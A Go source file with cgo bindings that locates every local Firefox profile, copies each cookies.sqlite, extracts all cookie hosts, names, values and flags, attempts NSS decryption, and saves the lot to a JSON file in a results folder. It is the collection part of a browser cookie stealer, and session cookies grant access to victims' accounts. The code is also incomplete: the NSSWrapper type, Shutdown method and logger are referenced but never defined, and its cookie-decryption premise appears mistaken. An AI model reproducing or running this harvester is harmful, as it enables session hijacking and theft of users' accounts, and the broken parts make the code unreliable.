//go:build windows
// +build windows

package firefox

/*
#cgo LDFLAGS: -LC:/PROGRA~1/MOZILL~1 -lnss3 -lmozglue
#cgo CFLAGS: -IC:/PROGRA~1/MOZILL~1

#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef int PRBool;
typedef int SECStatus;
typedef enum {
    siBuffer = 0
} SECItemType;

typedef struct {
    SECItemType type;
    unsigned char *data;
    unsigned int len;
} SECItem;

typedef struct PK11SlotInfoStr PK11SlotInfo;

#define SECSuccess 0
#define SECFailure -1
#define PR_TRUE 1
#define PR_FALSE 0

typedef SECStatus (*NSS_Init_t)(const char *);
typedef SECStatus (*NSS_Shutdown_t)(void);
typedef PK11SlotInfo* (*PK11_GetInternalKeySlot_t)(void);
typedef void (*PK11_FreeSlot_t)(PK11SlotInfo *);
typedef PRBool (*PK11_NeedLogin_t)(PK11SlotInfo *);
typedef SECStatus (*PK11_CheckUserPassword_t)(PK11SlotInfo *, const char *);
typedef SECStatus (*PK11SDR_Decrypt_t)(SECItem *, SECItem *, void *);
typedef void (*SECITEM_ZfreeItem_t)(SECItem *, PRBool);
typedef int (*PORT_GetError_t)(void);

static HMODULE nss3_dll = NULL;
static HMODULE mozglue_dll = NULL;

static NSS_Init_t NSS_Init_ptr = NULL;
static NSS_Shutdown_t NSS_Shutdown_ptr = NULL;
static PK11_GetInternalKeySlot_t PK11_GetInternalKeySlot_ptr = NULL;
static PK11_FreeSlot_t PK11_FreeSlot_ptr = NULL;
static PK11_NeedLogin_t PK11_NeedLogin_ptr = NULL;
static PK11_CheckUserPassword_t PK11_CheckUserPassword_ptr = NULL;
static PK11SDR_Decrypt_t PK11SDR_Decrypt_ptr = NULL;
static SECITEM_ZfreeItem_t SECITEM_ZfreeItem_ptr = NULL;
static PORT_GetError_t PORT_GetError_ptr = NULL;

static int try_from_dir(const char *base) {
    char dll_path[MAX_PATH];
    DWORD err;

    snprintf(dll_path, MAX_PATH, "%s\\mozglue.dll", base);
    mozglue_dll = LoadLibraryA(dll_path);
    if (!mozglue_dll) {
        return -1;
    }

    snprintf(dll_path, MAX_PATH, "%s\\nss3.dll", base);
    nss3_dll = LoadLibraryA(dll_path);
    if (!nss3_dll) {
        FreeLibrary(mozglue_dll);
        mozglue_dll = NULL;
        return -1;
    }

    return 0;
}

static int load_nss_library(const char* firefox_path) {
    if (firefox_path && firefox_path[0] != '\0') {
        SetDllDirectoryA(firefox_path);
        if (try_from_dir(firefox_path) == 0) goto loaded_ok;
    }

    if (!nss3_dll && try_from_dir("C:\\Program Files\\Mozilla Firefox") == 0) goto loaded_ok;
    if (!nss3_dll && try_from_dir("C:\\Program Files (x86)\\Mozilla Firefox") == 0) goto loaded_ok;

    if (!mozglue_dll) mozglue_dll = LoadLibraryA("mozglue.dll");
    if (!nss3_dll && mozglue_dll) nss3_dll = LoadLibraryA("nss3.dll");

    if (!nss3_dll) return -1;

loaded_ok:
    NSS_Init_ptr = (NSS_Init_t)GetProcAddress(nss3_dll, "NSS_Init");
    NSS_Shutdown_ptr = (NSS_Shutdown_t)GetProcAddress(nss3_dll, "NSS_Shutdown");
    PK11_GetInternalKeySlot_ptr = (PK11_GetInternalKeySlot_t)GetProcAddress(nss3_dll, "PK11_GetInternalKeySlot");
    PK11_FreeSlot_ptr = (PK11_FreeSlot_t)GetProcAddress(nss3_dll, "PK11_FreeSlot");
    PK11_NeedLogin_ptr = (PK11_NeedLogin_t)GetProcAddress(nss3_dll, "PK11_NeedLogin");
    PK11_CheckUserPassword_ptr = (PK11_CheckUserPassword_t)GetProcAddress(nss3_dll, "PK11_CheckUserPassword");
    PK11SDR_Decrypt_ptr = (PK11SDR_Decrypt_t)GetProcAddress(nss3_dll, "PK11SDR_Decrypt");
    SECITEM_ZfreeItem_ptr = (SECITEM_ZfreeItem_t)GetProcAddress(nss3_dll, "SECITEM_ZfreeItem");
    PORT_GetError_ptr = (PORT_GetError_t)GetProcAddress(nss3_dll, "PORT_GetError");

    if (!NSS_Init_ptr || !NSS_Shutdown_ptr || !PK11SDR_Decrypt_ptr) {
        return -2;
    }
    return 0;
}

static void unload_nss_library() {
    if (nss3_dll) { FreeLibrary(nss3_dll); nss3_dll = NULL; }
    if (mozglue_dll) { FreeLibrary(mozglue_dll); mozglue_dll = NULL; }
}

static SECStatus my_NSS_Init(const char *configdir) {
    if (!NSS_Init_ptr) return SECFailure;
    return NSS_Init_ptr(configdir);
}

static SECStatus my_NSS_Shutdown() {
    if (!NSS_Shutdown_ptr) return SECFailure;
    return NSS_Shutdown_ptr();
}

static PK11SlotInfo* my_PK11_GetInternalKeySlot() {
    if (!PK11_GetInternalKeySlot_ptr) return NULL;
    return PK11_GetInternalKeySlot_ptr();
}

static void my_PK11_FreeSlot(PK11SlotInfo *slot) {
    if (PK11_FreeSlot_ptr) PK11_FreeSlot_ptr(slot);
}

static PRBool my_PK11_NeedLogin(PK11SlotInfo *slot) {
    if (!PK11_NeedLogin_ptr) return PR_FALSE;
    return PK11_NeedLogin_ptr(slot);
}

static SECStatus my_PK11_CheckUserPassword(PK11SlotInfo *slot, const char *password) {
    if (!PK11_CheckUserPassword_ptr) return SECFailure;
    return PK11_CheckUserPassword_ptr(slot, password);
}

static SECStatus my_PK11SDR_Decrypt(SECItem *data, SECItem *result, void *cx) {
    if (!PK11SDR_Decrypt_ptr) return SECFailure;
    return PK11SDR_Decrypt_ptr(data, result, cx);
}

static void my_SECITEM_ZfreeItem(SECItem *item, PRBool freeit) {
    if (SECITEM_ZfreeItem_ptr) SECITEM_ZfreeItem_ptr(item, freeit);
}

static int my_PORT_GetError() {
    if (!PORT_GetError_ptr) return -1;
    return PORT_GetError_ptr();
}
*/
import "C"

import (
	"bufio"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unsafe"
	"log"
	_ "modernc.org/sqlite"
)

type CookieEntry struct {
	Host           string  `json:"host"`
	Name           string  `json:"name"`
	Value          string  `json:"value"`
	DecryptedValue string  `json:"decrypted_value,omitempty"`
	Path           string  `json:"path,omitempty"`
	Expiry         *string `json:"expiry,omitempty"`
	CreationTime   *string `json:"creation_time,omitempty"`
	LastAccessed   *string `json:"last_accessed,omitempty"`
	IsSecure       bool    `json:"is_secure,omitempty"`
	IsHttpOnly     bool    `json:"is_http_only,omitempty"`
	SourceFile     string  `json:"_source_file,omitempty"`
}

// NSSWrapper provides NSS decryption functionality


func NewNSSWrapper(nonFatalDecryption bool) *NSSWrapper {
	return &NSSWrapper{
		nonFatalDecryption: nonFatalDecryption,
		initialized:        false,
	}
}

func LoadNSSLibrary(firefoxPath string) error {
	cPath := C.CString(firefoxPath)
	defer C.free(unsafe.Pointer(cPath))

	result := C.load_nss_library(cPath)
	if result == -1 {
		return fmt.Errorf("failed to load nss3.dll - Firefox may not be installed")
	}
	if result == -2 {
		return fmt.Errorf("failed to load NSS functions from nss3.dll")
	}
	return nil
}

func UnloadNSSLibrary() {
	C.unload_nss_library()
}

// Initialize sets up the NSS environment for a specific profile
func (n *NSSWrapper) Initialize(profilePath string) error {
	n.mutex.Lock()
	defer n.mutex.Unlock()

	if n.initialized {
		return nil
	}

	cPath := C.CString(profilePath)
	defer C.free(unsafe.Pointer(cPath))

	// Using fmt instead of a potentially nil logger
	// fmt.Printf("Initializing NSS for profile: %s\n", profilePath)

	if status := C.my_NSS_Init(cPath); status != C.SECSuccess {
		return fmt.Errorf("NSS_Init failed")
	}

	n.initialized = true
	return nil
}

// Shutdown closes the NSS environment


func (n *NSSWrapper) Authenticate(profile string, interactive bool) error {
	if !n.initialized {
		return fmt.Errorf("NSS not initialized")
	}

	keyslot := C.my_PK11_GetInternalKeySlot()
	if keyslot == nil {
		return fmt.Errorf("failed to get internal key slot")
	}
	defer C.my_PK11_FreeSlot(keyslot)

	needLogin := C.my_PK11_NeedLogin(keyslot)
	if needLogin == C.PR_TRUE {
		password := askPassword(profile, interactive)

		cPassword := C.CString(password)
		defer C.free(unsafe.Pointer(cPassword))

		errStatus := C.my_PK11_CheckUserPassword(keyslot, cPassword)
		if errStatus != C.SECSuccess {
			return fmt.Errorf("primary password incorrect")
		}
	}

	return nil
}

func (n *NSSWrapper) Decrypt(base64Data string) (string, error) {
	if !n.initialized {
		return "", fmt.Errorf("NSS not initialized")
	}

	data, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		return "", fmt.Errorf("failed to decode base64: %v", err)
	}

	var inp C.SECItem
	inp._type = C.siBuffer
	inp.data = (*C.uchar)(C.CBytes(data))
	inp.len = C.uint(len(data))
	defer C.free(unsafe.Pointer(inp.data))

	var out C.SECItem
	out._type = C.siBuffer
	out.data = nil
	out.len = 0

	errStatus := C.my_PK11SDR_Decrypt(&inp, &out, nil)
	if errStatus != C.SECSuccess {
		if n.nonFatalDecryption {
			return "", fmt.Errorf("decryption failed")
		}
		errCode := C.my_PORT_GetError()
		return "", fmt.Errorf("decryption failed with status %d, error code %d", errStatus, errCode)
	}

	result := C.GoStringN((*C.char)(unsafe.Pointer(out.data)), C.int(out.len))

	C.my_SECITEM_ZfreeItem(&out, C.PR_FALSE)

	return result, nil
}

func askPassword(profile string, interactive bool) string {
	if interactive && isTerminal() {
		fmt.Fprintf(os.Stderr, "\nPrimary Password for profile %s: ", profile)
		password, _ := readPassword()
		fmt.Fprintln(os.Stderr)
		return strings.TrimSpace(string(password))
	}
	fmt.Fprintln(os.Stderr, "Reading password from stdin...")
	reader := bufio.NewReader(os.Stdin)
	password, _ := reader.ReadString('\n')
	return strings.TrimSpace(password)
}

func isTerminal() bool {
	fileInfo, err := os.Stdin.Stat()
	if err != nil {
		return false
	}
	return (fileInfo.Mode() & os.ModeCharDevice) != 0
}

func readPassword() ([]byte, error) {
	reader := bufio.NewReader(os.Stdin)
	password, err := reader.ReadBytes('\n')
	if err != nil && err != io.EOF {
		return nil, err
	}
	if len(password) > 0 && password[len(password)-1] == '\n' {
		password = password[:len(password)-1]
	}
	if len(password) > 0 && password[len(password)-1] == '\r' {
		password = password[:len(password)-1]
	}
	return password, nil
}

func firefoxBase() string {
	home, _ := os.UserHomeDir()
	switch runtime.GOOS {
	case "windows":
		return filepath.Join(home, "AppData", "Roaming", "Mozilla", "Firefox")
	case "darwin":
		return filepath.Join(home, "Library", "Application Support", "Firefox")
	default:
		return filepath.Join(home, ".mozilla", "firefox")
	}
}

func findProfiles() []string {
	root := filepath.Join(firefoxBase(), "Profiles")
	if fi, _ := os.Stat(root); fi != nil && fi.IsDir() {
		ents, _ := os.ReadDir(root)
		out := make([]string, 0, len(ents))
		for _, e := range ents {
			if e.IsDir() {
				out = append(out, filepath.Join(root, e.Name()))
			}
		}
		return out
	}
	if fi, _ := os.Stat(firefoxBase()); fi != nil && fi.IsDir() {
		return []string{firefoxBase()}
	}
	return nil
}

func copyToTempCookie(src string) (string, error) {
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	tmp, err := os.CreateTemp("", "ff-cookies-*.sqlite")
	if err != nil {
		return "", err
	}
	tmpPath := tmp.Name()
	_, err = io.Copy(tmp, in)
	tmp.Close()
	if err != nil {
		os.Remove(tmpPath)
		return "", err
	}
	return tmpPath, nil
}

func parseNumericTime(v interface{}) *string {
	if v == nil {
		return nil
	}
	var i int64
	switch t := v.(type) {
	case int64:
		i = t
	case float64:
		i = int64(t)
	case int:
		i = int64(t)
	case string:
		if s := strings.TrimSpace(t); s != "" {
			if parsed, err := strconv.ParseInt(s, 10, 64); err == nil {
				i = parsed
			} else {
				return nil
			}
		} else {
			return nil
		}
	default:
		return nil
	}
	if i <= 0 {
		return nil
	}
	var ts time.Time
	switch {
	case i >= 1_000_000_000_000_000:
		sec := i / 1_000_000
		nsec := (i % 1_000_000) * 1000
		ts = time.Unix(sec, nsec)
	case i >= 1_000_000_000_000:
		sec := i / 1000
		nsec := (i % 1000) * 1_000_000
		ts = time.Unix(sec, nsec)
	case i >= 1_000_000_000:
		ts = time.Unix(i, 0)
	default:
		return nil
	}

	s := ts.Local().Format("2006-01-02 15:04:05")
	return &s
}

func queryCookies(dbPath string, nss *NSSWrapper) ([]CookieEntry, error) {
	tmp, err := copyToTempCookie(dbPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(tmp)

	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	queries := []string{
		`SELECT host, name, value, path, expiry, creationTime, lastAccessed, isSecure, isHttpOnly FROM moz_cookies`,
		`SELECT host, name, value, path, expiry, creationTime, lastAccessed FROM moz_cookies`,
		`SELECT host, name, value, path, expiry FROM moz_cookies`,
		`SELECT host, name, value FROM moz_cookies`,
	}

	for _, q := range queries {
		rows, err := db.Query(q)
		if err != nil {
			continue
		}
		defer rows.Close()

		cols, _ := rows.Columns()
		out := make([]CookieEntry, 0)
		for rows.Next() {
			vals := make([]interface{}, len(cols))
			for i := range vals {
				var x interface{}
				vals[i] = &x
			}
			if err := rows.Scan(vals...); err != nil {
				continue
			}
			getStr := func(i int) string {
				if i < 0 || i >= len(vals) {
					return ""
				}
				v := *(vals[i].(*interface{}))
				if v == nil {
					return ""
				}
				switch t := v.(type) {
				case string:
					return t
				case []byte:
					return string(t)
				default:
					return fmt.Sprintf("%v", t)
				}
			}
			getVal := func(i int) interface{} {
				if i < 0 || i >= len(vals) {
					return nil
				}
				return *(vals[i].(*interface{}))
			}

			c := CookieEntry{SourceFile: filepath.Base(dbPath)}
			if len(cols) > 0 {
				c.Host = getStr(0)
			}
			if len(cols) > 1 {
				c.Name = getStr(1)
			}
			if len(cols) > 2 {
				c.Value = getStr(2)

				if nss != nil && nss.initialized && c.Value != "" && isEncryptedCookie(c.Value) {
					decrypted, err := nss.Decrypt(c.Value)
					if err == nil && decrypted != "" {
						c.DecryptedValue = decrypted
					}
				}
			}
			if len(cols) > 3 {
				c.Path = getStr(3)
			}
			if len(cols) > 4 {
				c.Expiry = parseNumericTime(getVal(4))
			}
			if len(cols) > 5 {
				c.CreationTime = parseNumericTime(getVal(5))
			}
			if len(cols) > 6 {
				c.LastAccessed = parseNumericTime(getVal(6))
			}
			if len(cols) > 7 {
				v := getVal(7)
				c.IsSecure = isTruthy(v)
			}
			if len(cols) > 8 {
				v := getVal(8)
				c.IsHttpOnly = isTruthy(v)
			}
			if c.Name != "" || c.Host != "" {
				out = append(out, c)
			}
		}
		if len(out) > 0 {
			return out, nil
		}
	}
	return nil, fmt.Errorf("no cookie rows found")
}

func isTruthy(v interface{}) bool {
	if v == nil {
		return false
	}
	switch t := v.(type) {
	case int64:
		return t != 0
	case int:
		return t != 0
	case float64:
		return t != 0
	case []byte:
		s := string(t)
		return s == "1" || strings.EqualFold(s, "true")
	case string:
		return t == "1" || strings.EqualFold(t, "true")
	default:
		return false
	}
}

func isEncryptedCookie(value string) bool {
	if value == "" {
		return false
	}

	validBase64 := true
	for _, ch := range value {
		if !((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
			(ch >= '0' && ch <= '9') || ch == '+' || ch == '/' || ch == '=') {
			validBase64 = false
			break
		}
	}

	if !validBase64 {
		return false
	}

	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return false
	}

	if len(decoded) < 32 {
		return false
	}
	if len(decoded) > 0 && decoded[0] == 0x30 {
		return true
	}

	return false
}

func RunCookies() {
	fmt.Println("Extracting Firefox cookies...")
	if logger == nil {
		// keep same format your other code expects
		logger = log.New(os.Stderr, "", log.LstdFlags|log.Lshortfile)
	}
	var nss *NSSWrapper
	fmt.Println("Loading NSS library for decryption...")
	if err := LoadNSSLibrary(""); err != nil {
		fmt.Printf("Warning: Failed to load NSS library: %v\n", err)
		fmt.Println("Continuing without decryption...")
	} else {
		defer UnloadNSSLibrary()
		nss = NewNSSWrapper(true)
	}

	profiles := findProfiles()
	if len(profiles) == 0 {
		fmt.Println("No Firefox profiles found")
		return
	}

	result := map[string][]CookieEntry{}

	var nssInitialized bool
	if nss != nil {
		for _, p := range profiles {
			cookieDB := filepath.Join(p, "cookies.sqlite")
			if _, err := os.Stat(cookieDB); err == nil {
				// We now use the safe Initialize method defined within this file
				if err := nss.Initialize(p); err != nil {
					fmt.Printf("Warning: Failed to initialize NSS: %v\n", err)
				} else {
					defer nss.Shutdown()

					if err := nss.Authenticate(p, false); err != nil {
						fmt.Printf("Warning: Authentication failed: %v\n", err)
					} else {
						nssInitialized = true
						fmt.Println("NSS initialized and authenticated successfully")
					}
					break
				}
			}
		}
	}

	for _, p := range profiles {
		name := filepath.Base(p)
		cookieDB := filepath.Join(p, "cookies.sqlite")
		if _, err := os.Stat(cookieDB); err != nil {
			continue
		}

		var nssToUse *NSSWrapper
		if nssInitialized {
			nssToUse = nss
		}

		rows, err := queryCookies(cookieDB, nssToUse)
		if err != nil {
			fmt.Printf("Warning: Failed to query cookies from %s: %v\n", name, err)
			continue
		}
		if len(rows) > 0 {
			result[name] = rows
			fmt.Printf("Extracted %d cookies from profile %s\n", len(rows), name)
		}
	}

	exeDir, _ := os.Executable()
	resultsDir := filepath.Join(filepath.Dir(exeDir), "results")
	os.MkdirAll(resultsDir, 0755)
	outputPath := filepath.Join(resultsDir, "firefox_cookies.json")

	f, err := os.Create(outputPath)
	if err != nil {
		fmt.Println("Error creating output file:", err)
		return
	}
	defer f.Close()

	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	if err := enc.Encode(result); err != nil {
		fmt.Println("Error writing JSON:", err)
		return
	}
	fmt.Println("Saved Firefox cookies to:", outputPath)
}